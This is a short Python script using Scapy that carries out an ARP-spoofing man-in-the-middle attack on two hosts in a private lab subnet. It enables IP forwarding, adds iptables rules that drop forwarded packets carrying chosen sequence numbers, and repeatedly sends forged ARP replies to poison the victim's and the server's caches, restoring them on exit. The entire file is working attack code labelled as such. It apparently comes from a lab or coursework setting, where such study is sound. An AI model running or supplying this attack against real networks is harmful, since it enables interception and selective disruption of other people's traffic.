from scapy.all import *
import sys
import os
import time

interface = "ens33"
victimIP = "192.168.112.131"	#client 
gateIP = "192.168.112.132"		#server

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#choose wich packet the adversary want to drop
sequence_number = input("Enter desired sequence numbers to drop: ")
seq_list = sequence_number.split(' ')
for x in seq_list:
	ip_table_cmd = 'iptables -A FORWARD -m string --algo bm --string sn:' + x + ' -j DROP'
	os.system(ip_table_cmd)

#send broadcast to find the mac of a certain IP Address
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

#restore the originial mac address
def restoreMACS():
	print("\n~Restoring to normal~")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print("~Attack ends~")
	sys.exit(1)

#sending false ARP quary to confuse the victims
def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def AbortAttack(msg):
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")	
	os.system('iptables -F')
	print("Couldn't Find "+msg+" MAC Address")
	print("~Attack ends~")
	sys.exit(1)

def Attack():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		AbortAttack(victimIP)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		AbortAttack(gateIP)
	print("~ATTACK is on - Targets poisoned~")

	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			os.system('iptables -F')
			restoreMACS()
			break
Attack()